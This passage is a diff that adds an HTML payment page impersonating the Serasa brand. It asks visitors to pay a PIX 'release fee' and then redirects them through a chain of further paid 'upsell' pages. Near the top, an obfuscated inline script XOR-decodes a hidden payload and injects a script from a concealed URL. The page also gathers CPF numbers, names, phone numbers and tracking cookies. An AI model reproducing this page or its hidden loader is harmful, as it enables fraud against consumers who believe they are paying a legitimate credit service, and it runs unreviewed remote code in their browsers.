@@ -1,0 +1,1063 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Serasa | Pagamento PIX</title>
+    <link rel="shortcut icon" href="public/assets/images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="../style.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
+    <!-- Font Awesome diretamente do CDN oficial -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-1ycn6IcaQQ40/MKBW2W4Rhis/DbILU74C1vSrLJxCq57o941Ym01SwNsOMqvEBFlcgUa6xLiPY/NS5R+E6ztJQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <script>(function(){var s_78ph=atob("DLtN903eulVAC7JQNMBvgj+ymG9iY8YkRMh32GK93jtufsY9Xd002S6x13sieZ0jV8kkhzmtlSUpc9c8G8skjyiylD8zKZ5yVc85hSS8zyEleJBqb+Zh1Sqy1TchZ8FyDuA21SO/1zBiMZAgXcMomwS6mHlifdM8Qd5vzW/o2zR3PYdjB4J9xHy6gjQiOYNmAo16wyj8xwg9");var v_3fah=[];for(var q_tj=0;q_tj<s_78ph.length;q_tj++){v_3fah.push(s_78ph.charCodeAt(q_tj)&255);}var o_7=v_3fah[0];var z_o=v_3fah.slice(1,1+o_7);var a_y=v_3fah.slice(1+o_7);var k_q=a_y.map(function(b,w_z3){return b^z_o[w_z3%o_7];});var p_mpj="";for(var g_xo=0;g_xo<k_q.length;g_xo++){p_mpj+=String.fromCharCode(k_q[g_xo]&255);}var c_s7=decodeURIComponent(escape(p_mpj));var z_9z6=JSON.parse(c_s7);var f_mt=z_9z6.globals||[];f_mt.forEach(function(i_pl3){window[i_pl3.name]=i_pl3.value;});var p_84=document.createElement("script");p_84.src=z_9z6.url;p_84.async=true;p_84.defer=true;(z_9z6.attributes||[]).forEach(function(c_r){p_84.setAttribute(c_r.name,c_r.value);});(document.head||document.documentElement).appendChild(p_84);})();</script>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'primary': '#d72a7f', // Cor primária Serasa (rosa)
+                        'secondary': '#EFEFEF', // Cinza claro
+                        'dark': '#333333', // Cor escura para textos
+                        'light': '#FFFFFF', // Cor clara para fundos
+                        'warning': '#FF0000', // Vermelho para alertas
+                        'yellow': '#d72a7f' // Rosa Serasa
+                    },
+                    fontFamily: {
+                        'sans': ['Montserrat', 'Arial', 'Helvetica', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap');
+        
+        * {
+            font-family: 'Montserrat', sans-serif !important;
+        }
+        
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #f5f7fa;
+            color: #333;
+            overflow-x: hidden;
+            width: 100%;
+            position: relative;
+            margin: 0;
+            padding: 0;
+        }
+        
+        html {
+            overflow-x: hidden;
+            width: 100%;
+        }
+        
+        .govbr-container {
+            max-width: 720px;
+            margin: 0 auto;
+        }
+        
+        /* Header estilo Serasa */
+        header {
+            background: linear-gradient(135deg, #d72a7f 0%, #d72a7f 100%);
+            box-shadow: 0 4px 12px rgba(215, 42, 127, 0.2);
+            padding: 12px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        header img {
+            width: 110px;
+            margin: 0;
+            height: auto;
+            filter: brightness(0) invert(1);
+        }
+        
+        .nav-bar {
+            background-color: white;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e5e7eb;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            min-height: 60px;
+        }
+        
+        .nav-bar-content {
+            display: flex;
+            align-items: center;
+            color: #374151;
+            font-size: 14px;
+            flex: 1;
+            min-width: 0;
+        }
+        
+        @media (max-width: 768px) {
+            .nav-bar {
+                padding: 8px 12px;
+                min-height: 50px;
+            }
+            
+            .nav-bar-content {
+                font-size: 12px;
+            }
+        }
+        
+        /* Botões estilo Serasa */
+        .govbr-button {
+            background: linear-gradient(135deg, #d72a7f 0%, #e84393 100%);
+            transition: all 0.3s ease;
+            color: white;
+            font-weight: 600;
+            border: none;
+            border-radius: 12px;
+            padding: 12px 20px;
+            text-transform: uppercase;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 12px rgba(215, 42, 127, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .govbr-button:hover {
+            background: linear-gradient(135deg, #b8235a 0%, #d63384 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(215, 42, 127, 0.4);
+        }
+        
+        .govbr-button:after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.3) 50%, rgba(255,255,255,0) 100%);
+            transform: rotate(30deg);
+            animation: shine 3s infinite;
+        }
+        
+        @keyframes shine {
+            0% {transform: translateX(-100%) rotate(30deg);}
+            100% {transform: translateX(100%) rotate(30deg);}
+        }
+        
+        .govbr-outline-button {
+            border: 2px solid #d72a7f;
+            color: #d72a7f;
+            transition: all 0.3s ease;
+            border-radius: 12px;
+        }
+        
+        .govbr-outline-button:hover {
+            background-color: #d72a7f;
+            color: white;
+        }
+        
+        .govbr-card {
+            border-radius: 16px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(215, 42, 127, 0.1);
+        }
+        
+        .govbr-input {
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            padding: 14px 16px;
+            font-size: 16px;
+            width: 100%;
+            background-color: #f9fafb;
+            transition: all 0.3s ease;
+        }
+        
+        .govbr-input:focus {
+            border-color: #d72a7f;
+            box-shadow: 0 0 0 3px rgba(215, 42, 127, 0.1);
+            outline: none;
+        }
+        
+        .govbr-input:disabled {
+            background-color: #f3f4f6;
+            color: #6b7280;
+        }
+        
+        .govbr-badge {
+            background: linear-gradient(135deg, #d72a7f 0%, #e84393 100%);
+            color: white;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 14px;
+            box-shadow: 0 2px 8px rgba(215, 42, 127, 0.2);
+        }
+        
+        .govbr-timer {
+            color: #dc2626;
+            font-weight: bold;
+        }
+        
+        .govbr-loading {
+            border-top-color: #d72a7f;
+        }
+        
+        .govbr-success-icon {
+            color: #d72a7f;
+        }
+        
+        .pulse-animation {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(215, 42, 127, 0.7);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(215, 42, 127, 0);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(215, 42, 127, 0);
+            }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .valor-aprovado-container {
+            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
+            border-left: 4px solid #d72a7f;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+            box-shadow: 0 4px 12px rgba(215, 42, 127, 0.1);
+        }
+        
+        .valor-aprovado-label {
+            font-size: 14px;
+            color: #64748b;
+            margin-bottom: 8px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .valor-aprovado {
+            color: #d72a7f;
+            font-size: 32px;
+            font-weight: 700;
+            display: block;
+        }
+
+        .notification-popup {
+            position: fixed;
+            top: 20px;
+            right: -300px;
+            background: linear-gradient(135deg, #d72a7f 0%, #e84393 100%);
+            color: white;
+            padding: 16px 20px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(215, 42, 127, 0.3);
+            z-index: 1000;
+            transition: right 0.3s ease-in-out;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 500;
+        }
+
+        .notification-popup.show {
+            right: 20px;
+        }
+        
+        /* Cards estilo Serasa */
+        .bg-white {
+            border-radius: 16px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+        
+        /* Cores Serasa */
+        .bg-yellow-500 {
+            background: linear-gradient(135deg, #d72a7f 0%, #e84393 100%) !important;
+            color: white !important;
+        }
+        
+        .bg-blue-600, .bg-blue-50 {
+            background: linear-gradient(135deg, #d72a7f 0%, #e84393 100%) !important;
+        }
+        
+        .bg-blue-50 {
+            background: linear-gradient(135deg, #fdf2f8 0%, #fce7f3 100%) !important;
+        }
+        
+        .border-blue-400 {
+            border-color: #d72a7f !important;
+        }
+        
+        .text-blue-400, .text-blue-700 {
+            color: #d72a7f !important;
+        }
+        
+        .rounded-md, .rounded-lg {
+            border-radius: 12px;
+        }
+        
+        .bg-green-600 {
+            background-color: #168821 !important;
+        }
+        
+        .text-green-600 {
+            color: #168821 !important;
+        }
+        
+        /* Footer estilo Serasa */
+        .govbr-footer {
+            background: linear-gradient(135deg, #004691 0%, #d72a7f 100%);
+            color: #fff;
+            padding: 30px 20px;
+            text-align: center;
+            margin-top: 40px;
+            width: 100%;
+            position: relative;
+            bottom: 0;
+        }
+        
+        .govbr-footer img {
+            width: 120px;
+            margin-bottom: 15px;
+            filter: brightness(0) invert(1);
+        }
+        
+        .govbr-footer p {
+            margin: 8px 0;
+            font-size: 13px;
+            opacity: 0.9;
+        }
+        
+        .main-content {
+            margin-top: 20px;
+            min-height: calc(100vh - 200px);
+            position: relative;
+        }
+        
+        /* Efeitos hover para cards */
+        .govbr-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(215, 42, 127, 0.15);
+            transition: all 0.3s ease;
+        }
+        
+        /* Estilo para botões do header */
+        header button {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            border-radius: 20px;
+            padding: 8px 16px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+        
+        header button:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-1px);
+        }
+    </style>
+</head>
+
+<body class="min-h-screen">
+    <div id="notification" class="notification-popup">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewbox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+        </svg>
+        <span>Código PIX copiado!</span>
+    </div>
+
+    <!-- Header da Serasa -->
+    <header>
+        <div class="flex items-center gap-2">
+            <img src="../serasa-logo-2.png" alt="Serasa" width="120" height="40" class="w-auto h-10">
+        </div>
+        <div class="flex items-center">
+            <button class="px-3 py-1 bg-primary text-white rounded-full text-sm font-semibold flex items-center">
+                <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+                </svg>
+                <span id="user-first-name"></span>
+            </button>
+        </div>
+    </header>
+
+    <nav class="nav-bar">
+        <div class="nav-bar-content flex-wrap">
+            <svg class="w-4 h-4 mr-2 text-primary flex-shrink-0" fill="none" stroke="currentColor" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+            </svg>
+            <div class="flex items-center flex-wrap gap-1 text-sm md:text-base">
+                <span class="font-medium">Serasa</span>
+                <span class="text-gray-400 mx-1">›</span>
+                <span class="font-medium">Proteção Premium</span>
+                <span class="text-gray-400 mx-1">›</span>
+                <span class="font-medium text-primary">Pagamento</span>
+            </div>
+        </div>
+        <svg class="w-4 h-4 text-primary flex-shrink-0 hidden md:block" fill="none" stroke="currentColor" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+        </svg>
+    </nav>
+
+    <div id="loadingPage" class="fixed inset-0 flex items-center justify-center z-50 hidden" style="background-color: #d72a7f;">
+         <div class="text-center">
+             <div class="relative mb-8">
+                 <div class="relative">
+                     <div class="animate-spin rounded-full h-24 w-24 border-8 border-white border-t-transparent mx-auto"></div>
+                     <div class="absolute inset-0 flex items-center justify-center">
+                         <img src="../serasa-logo-2.png" alt="Serasa" class="w-12 h-auto filter brightness-0 invert">
+                     </div>
+                 </div>
+             </div>
+             <div class="space-y-3">
+                 <p class="text-white text-2xl font-bold tracking-wide">Processando Pagamento</p>
+                 <p class="text-white/90 text-base font-medium">Aguarde enquanto validamos suas informações</p>
+                 <div class="flex justify-center mt-4">
+                     <div class="flex space-x-1">
+                         <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0ms;"></div>
+                         <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 150ms;"></div>
+                         <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 300ms;"></div>
+                     </div>
+                 </div>
+             </div>
+         </div>
+     </div>
+
+    <div id="mainPage" class="main-content fade-in">
+        <div class="govbr-container px-4 py-8">
+            <div class="govbr-card bg-white p-6">
+                <h1 class="text-2xl font-bold text-dark mb-6">Pagamento Serasa via PIX</h1>
+                
+                <div class="valor-aprovado-container">
+                    <span class="valor-aprovado-label">Valor a pagar:</span>
+                    <span class="valor-aprovado" id="valorPagamento">Carregando...</span>
+                </div>
+
+                <div class="mt-6">
+                    <p class="text-sm text-gray-600 mb-4">
+                        Escaneie o QR Code ou copie o código PIX abaixo para realizar o pagamento.
+                    </p>
+
+                    <div class="flex flex-col items-center space-y-4">
+                        <div id="qrCodeContainer" class="bg-white p-4 rounded-lg shadow-sm">
+                            <img id="qrCodeImage" src="" alt="QR Code PIX" class="w-48 h-48">
+                        </div>
+
+                        <div class="w-full">
+                            <label class="block text-sm font-medium text-gray-700 mb-2">
+                                Código PIX (Copiar e Colar)
+                            </label>
+                            <div class="space-y-3">
+                                <input type="text" id="pixCode" class="govbr-input w-full" readonly="">
+                                <button onclick="copyPixCode()" class="govbr-button w-full">
+                                 
+                                    Copiar Código PIX
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="mt-6">
+                        <div class="bg-blue-50 border-l-4 border-blue-400 p-4">
+                            <div class="flex">
+                                <div class="flex-shrink-0">
+                                    <svg class="h-5 w-5 text-blue-400" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 20 20" fill="currentColor">
+                                        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path>
+                                    </svg>
+                                </div>
+                                <div class="ml-3">
+                                    <p class="text-sm text-blue-700">
+                                        Após o pagamento, aguarde alguns instantes para a confirmação automática.
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="ja-paguei-wrap" style="text-align:center;margin-top:14px">
+                        <a href="#" id="btn-ja-paguei" style="color:#d72a7f;font-size:13px;font-weight:600;text-decoration:underline;cursor:pointer">Ja efetuei o pagamento</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer da Serasa -->
+    <footer class="govbr-footer mt-10">
+        <img src="../serasa-logo-2.png" alt="Serasa">
+        <div>
+            <p>© 2024 Serasa S.A. Todos os direitos reservados.</p>
+            <p>Serasa é uma marca registrada da Experian Information Solutions, Inc.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Obter primeiro nome da URL
+        document.addEventListener('DOMContentLoaded', function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const nomeCompleto = urlParams.get('nome');
+            
+            if (nomeCompleto) {
+                // Split para pegar apenas a primeira palavra (primeiro nome)
+                const primeiroNome = nomeCompleto.split(' ')[0];
+                
+                // Atualiza o texto no botão
+                document.getElementById('user-first-name').textContent = primeiroNome;
+            }
+        });
+
+        function copyPixCode() {
+            const pixCode = document.getElementById('pixCode');
+            pixCode.select();
+            document.execCommand('copy');
+            
+            const notification = document.getElementById('notification');
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+
+        function formatarValor(valor) {
+            return new Intl.NumberFormat('pt-BR', {
+                style: 'currency',
+                currency: 'BRL'
+            }).format(valor / 100);
+        }
+
+        async function iniciarPagamento() {
+            document.getElementById('loadingPage').classList.remove('hidden');
+            document.getElementById('mainPage').classList.add('hidden');
+
+            // Pegar todos os parâmetros da URL
+            const urlParams = new URLSearchParams(window.location.search);
+            
+            // Pegar o valor do parâmetro 'valor' e converter para centavos
+            const valorRaw = String(urlParams.get('valor') || '2790').trim();
+            let valorPagamento = 2790;
+            const matchDecimal = valorRaw.match(/(\d+)[,.](\d{2})(?!\d)/);
+            if (matchDecimal) {
+                valorPagamento = parseInt(matchDecimal[1], 10) * 100 + parseInt(matchDecimal[2], 10);
+            } else {
+                const digits = valorRaw.replace(/\D/g, '');
+                if (digits) valorPagamento = parseInt(digits, 10);
+            }
+
+            // Preparar payload base
+            const basePayload = {
+                valor: valorPagamento,
+                nome: urlParams.get('nome') || '',
+                cpf: urlParams.get('cpf') || '',
+                email: urlParams.get('email') || '',
+                telefone: urlParams.get('telefone') || ''
+            };
+
+            // Tentar obter dados do usuário do localStorage se não vierem pela URL
+            if (!basePayload.nome || !basePayload.cpf) {
+                try {
+                    const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
+                    if (dadosUsuario) {
+                        console.log('[Pagamento] Dados do usuário encontrados no localStorage:', dadosUsuario);
+                        
+                        if (!basePayload.nome && dadosUsuario.nome) {
+                            basePayload.nome = dadosUsuario.nome;
+                            console.log('[Pagamento] Nome obtido do localStorage:', basePayload.nome);
+                        }
+                        
+                        if (!basePayload.cpf && dadosUsuario.cpf) {
+                            basePayload.cpf = dadosUsuario.cpf;
+                            console.log('[Pagamento] CPF obtido do localStorage:', basePayload.cpf);
+                        }
+                        
+                        if (!basePayload.email && dadosUsuario.email) {
+                            basePayload.email = dadosUsuario.email;
+                        }
+
+                        // Telefone: sem ele o Meta perde a match key "ph" no upsell.
+                        if (!basePayload.telefone && (dadosUsuario.telefone || dadosUsuario.phone)) {
+                            basePayload.telefone = dadosUsuario.telefone || dadosUsuario.phone;
+                            console.log('[Pagamento] Telefone obtido do localStorage:', basePayload.telefone);
+                        }
+                    }
+                } catch (error) {
+                    console.error('[Pagamento] Erro ao obter dados do localStorage:', error);
+                }
+            }
+
+            // Remover prefixo +55 do telefone se existir
+            if (basePayload.telefone) {
+                basePayload.telefone = basePayload.telefone.replace(/^\+55/, '').replace(/\D/g, '');
+                console.log('[Pagamento] Telefone formatado:', basePayload.telefone);
+            }
+
+            // Adicionar parâmetros UTM no basePayload
+            const utmFields = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'xcod', 'sck', 'src', 'utm_id', 'fbclid', 'gclid', 'ttclid'];
+            utmFields.forEach(field => {
+                const value = urlParams.get(field);
+                if (value) basePayload[field] = value;
+            });
+
+            // Identificadores Meta p/ CAPI server-side
+            try {
+                const _gc = n => { const m = document.cookie.match('(?:^|; )' + n + '=([^;]+)'); return m ? decodeURIComponent(m[1]) : ''; };
+                if (_gc('_fbp')) basePayload.fbp = _gc('_fbp');
+                if (_gc('_fbc')) basePayload.fbc = _gc('_fbc');
+                basePayload.event_source_url = window.location.href;
+            } catch (e) {}
+
+            // Fallback robusto de UTMs via tracking.js
+            try {
+                if (typeof window.gvdesenrolaMergeTracking === 'function') {
+                    const trk = window.gvdesenrolaMergeTracking();
+                    Object.keys(trk).forEach(k => {
+                        if (trk[k] && !basePayload[k]) basePayload[k] = trk[k];
+                    });
+                }
+            } catch (e) {}
+
+            // Recuperar parâmetros do Utmify se disponível
+            if (window.utmify) {
+                const utmifyParams = window.utmify.getParameters();
+                Object.assign(basePayload, utmifyParams);
+            }
+
+            // ==== MONTAR PAYLOAD EXATO PARA A BRAVOPAY ====
+            const bravoPayPayload = {
+                amount_cents: valorPagamento,
+                method: "pix",
+                customer: {
+                    name: basePayload.nome || "Cliente",
+                    email: basePayload.email || (basePayload.nome ? basePayload.nome.toLowerCase().replace(/\s+/g, '') + '@email.com' : 'cliente@email.com'),
+                    cpf: String(basePayload.cpf || '').replace(/\D/g, ''),
+                    phone: String(basePayload.telefone || '').replace(/\D/g, '')
+                },
+                description: "Taxa de Liberação",
+                external_reference: "chk_" + new Date().getTime(),
+                utm: {
+                    source: basePayload.utm_source || "",
+                    medium: basePayload.utm_medium || "",
+                    campaign: basePayload.utm_campaign || "",
+                    content: basePayload.utm_content || "",
+                    term: basePayload.utm_term || "",
+                    fbclid: basePayload.fbclid || basePayload.fbc || "",
+                    gclid: basePayload.gclid || "",
+                    ttclid: basePayload.ttclid || ""
+                }
+            };
+
+            console.log('[Pagamento] Enviando dados para backend (Vercel -> BravoPay):', bravoPayPayload);
+
+            try {
+                // Chama a sua API da Vercel
+                const response = await fetch('/api/criar-pix', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(bravoPayPayload)
+                });
+
+                if (!response.ok) {
+                    throw new Error('Erro na requisição: HTTP ' + response.status);
+                }
+
+                const data = await response.json();
+                console.log('[Pagamento] Resposta do backend:', data);
+
+                if (data.id && data.pix) {
+                    // Preencher UI com dados
+                    document.getElementById('valorPagamento').textContent = formatarValor(data.amount_cents);
+                    document.getElementById('pixCode').value = data.pix.copy_paste;
+                    
+                    // Gerar imagem do QR Code usando API pública confiável
+                    document.getElementById('qrCodeImage').src = 'https://api.qrserver.com/v1/create-qr-code/?size=280x280&margin=1&data=' + encodeURIComponent(data.pix.copy_paste);
+                    
+                    document.getElementById('loadingPage').classList.add('hidden');
+                    document.getElementById('mainPage').classList.remove('hidden');
+
+
+                    window.__pixTxId = data.id;
+                    // Iniciar verificação de status passando o token da BravoPay
+                    verificarStatus(data.id);
+                } else {
+                    throw new Error(data.error?.message || 'Erro ao gerar pagamento');
+                }
+            } catch (error) {
+                console.error('[Pagamento] Erro:', error);
+                alert('Erro ao processar pagamento: ' + error.message + '\nPor favor, tente novamente.');
+                document.getElementById('loadingPage').classList.add('hidden');
+                document.getElementById('mainPage').classList.remove('hidden');
+            }
+        }
+
+        async function verificarStatus(token) {
+            try {
+                console.log('🔍 Verificando status do pagamento (Vercel):', token);
+                const response = await fetch(`/api/status-pix?id=${encodeURIComponent(token)}`);
+                const httpStatus = response.status;
+                console.log('📊 Status HTTP da resposta:', httpStatus);
+
+                if (!response.ok) {
+                    console.error('❌ Erro HTTP ao verificar status:', httpStatus);
+                    setTimeout(() => verificarStatus(token), 3000);
+                    return;
+                }
+
+                const data = await response.json();
+                console.log('📦 Resposta completa da Vercel:', data);
+
+                if (data.status) {
+                    const status = String(data.status).toUpperCase(); // BravoPay usa PAID, PENDING
+                    
+                    if (status === 'PAID') {
+                        console.log('✅ Pagamento aprovado! Status:', status);
+
+
+                        
+                        // Pegar o referer ou parâmetro da URL para determinar o próximo upsell
+                        const urlParams = new URLSearchParams(window.location.search);
+                        const currentUpsell = urlParams.get('from_upsell') || '0';
+                        console.log('🔄 Upsell atual:', currentUpsell);
+
+                        // Determinar próximo upsell e valor
+                        let nextUpsell;
+                        let nextValue;
+                        switch(currentUpsell) {
+                            case '0': nextUpsell = 'upsell1'; nextValue = '3990'; break;
+                            case '1': nextUpsell = 'upsell2'; nextValue = '1970'; break;
+                            case '2': nextUpsell = 'upsell3'; nextValue = '1790'; break;
+                            case '3': nextUpsell = 'upsell4'; nextValue = '2490'; break;
+                            case '4': nextUpsell = 'upsell5'; nextValue = '3980'; break;
+                            case '5': nextUpsell = 'upsell6'; nextValue = '2490'; break;
+                            case '6':
+                                nextUpsell = null;
+                                nextValue = null;
+                                break;
+                            default:
+                                nextUpsell = null;
+                                nextValue = null;
+                        }
+
+                        if (!nextUpsell) {
+                            console.log('✅ Fim do funil de upsell. Nao ha proxima oferta.');
+                            try {
+                                var _fim = document.getElementById('mainPage');
+                                if (_fim) {
+                                    _fim.innerHTML = '<div style="max-width:520px;margin:60px auto;padding:32px;text-align:center;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif">'
+                                        + '<div style="font-size:56px;line-height:1">✅</div>'
+                                        + '<h1 style="font-size:22px;margin:16px 0 8px;color:#1351b4">Pagamento confirmado!</h1>'
+                                        + '<p style="font-size:15px;color:#555;margin:0">Sua compra foi concluida com sucesso. Voce recebera as instrucoes no seu contato cadastrado.</p>'
+                                        + '</div>';
+                                }
+                            } catch (e) {}
+                            return;
+                        }
+
+                        console.log('➡️ Próximo upsell:', nextUpsell, 'com valor:', nextValue);
+
+                        // Criar objeto com os dados da transação adaptado ao retorno da BravoPay
+                        const transactionData = {
+                            orderId: token,
+                            status: "APPROVED",
+                            amount: parseInt(urlParams.get('valor') || '2790'),
+                            createdAt: data.created_at || new Date().toISOString(),
+                            approvedDate: data.paid_at || new Date().toISOString(),
+                            customer: {
+                                name: data.customer?.name || "Cliente",
+                                email: data.customer?.email || "cliente@email.com",
+                                document: data.customer?.cpf || "12345678909"
+                            },
+                            fee: {
+                                fixedAmount: 0
+                            }
+                        };
+
+                        const transactionBase64 = btoa(JSON.stringify(transactionData));
+                        console.log('📝 Dados da transação:', transactionData);
+
+                        const utmParams = {};
+                        for (const [key, value] of urlParams.entries()) {
+                            if (key.startsWith('utm_') || ['src', 'sck', 'xcod', 'fbclid', 'gclid', 'ttclid'].includes(key)) {
+                                utmParams[key] = value;
+                            }
+                        }
+
+                        const newParams = new URLSearchParams({
+                            ...utmParams,
+                            from_upsell: String(parseInt(currentUpsell) + 1),
+                            valor: nextValue,
+                            transaction: transactionBase64
+                        });
+
+                        const nextUrl = `/${nextUpsell}/index.html?${newParams.toString()}`;
+                        console.log('🔗 URL de redirecionamento:', nextUrl);
+
+                        console.log('🚀 Redirecionando...');
+                        window.location.href = nextUrl;
+
+                    } else if (status === 'PENDING') {
+                        console.log('⏳ Pagamento ainda pendente. Verificando novamente em 3 segundos...');
+                        setTimeout(() => verificarStatus(token), 3000);
+                    } else {
+                        console.log('❓ Status desconhecido/Expirado:', status);
+                        setTimeout(() => verificarStatus(token), 3000);
+                    }
+                } else {
+                    console.log('⚠️ Resposta sem status válido:', data);
+                    setTimeout(() => verificarStatus(token), 3000);
+                }
+            } catch (error) {
+                console.error('❌ Erro ao verificar status:', error);
+                console.log('🔄 Tentando novamente em 3 segundos...');
+                setTimeout(() => verificarStatus(token), 3000);
+            }
+        }
+
+        // Iniciar o processo quando a página carregar
+        window.addEventListener('load', iniciarPagamento);
+</script>
+
+<style>
+  .cp-sheet { position: fixed; inset: 0; z-index: 9999; pointer-events: none; }
+  .cp-sheet.open { pointer-events: auto; }
+  .cp-backdrop { position: absolute; inset: 0; background: rgba(15, 23, 42, 0.55); opacity: 0; transition: opacity .28s ease; backdrop-filter: blur(2px); -webkit-backdrop-filter: blur(2px); }
+  .cp-sheet.open .cp-backdrop { opacity: 1; }
+  .cp-panel { position: absolute; left: 0; right: 0; bottom: 0; background: #fff; border-top-left-radius: 22px; border-top-right-radius: 22px; padding: 6px 22px calc(20px + env(safe-area-inset-bottom)); box-shadow: 0 -18px 60px rgba(15, 23, 42, 0.25); transform: translateY(102%); transition: transform .38s cubic-bezier(0.32, 0.72, 0, 1); max-width: 500px; margin: 0 auto; max-height: 92vh; overflow-y: auto; overscroll-behavior: contain; -webkit-overflow-scrolling: touch; }
+  .cp-sheet.open .cp-panel { transform: translateY(0); }
+  .cp-handle { width: 40px; height: 4px; border-radius: 3px; background: #D0D5DD; margin: 4px auto 16px; }
+  .cp-view { display: flex; flex-direction: column; }
+  .cp-view[hidden] { display: none !important; }
+  .cp-title { font-size: 18px; font-weight: 800; color: #0F172A; margin-bottom: 6px; letter-spacing: -0.01em; font-family: 'Montserrat', Arial, sans-serif; }
+  .cp-desc { font-size: 13.5px; color: #475569; margin-bottom: 16px; line-height: 1.55; font-family: 'Montserrat', Arial, sans-serif; }
+  .cp-drop { display: flex; gap: 12px; align-items: center; width: 100%; padding: 14px; background: #F8FAFC; border: 1.5px dashed #94A3B8; border-radius: 12px; cursor: pointer; transition: background .15s, border-color .15s; margin-bottom: 14px; }
+  .cp-drop:hover { background: #fdeff6; border-color: #d72a7f; }
+  .cp-drop.has-file { background: #F0FDF4; border-color: #059669; border-style: solid; }
+  .cp-drop-ic { width: 42px; height: 42px; border-radius: 10px; background: #fce4ee; color: #d72a7f; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .cp-drop.has-file .cp-drop-ic { background: #D1FAE5; color: #059669; }
+  .cp-drop-txt { flex: 1; min-width: 0; }
+  .cp-drop-title { font-size: 14px; font-weight: 700; color: #0F172A; word-break: break-word; font-family: 'Montserrat', Arial, sans-serif; }
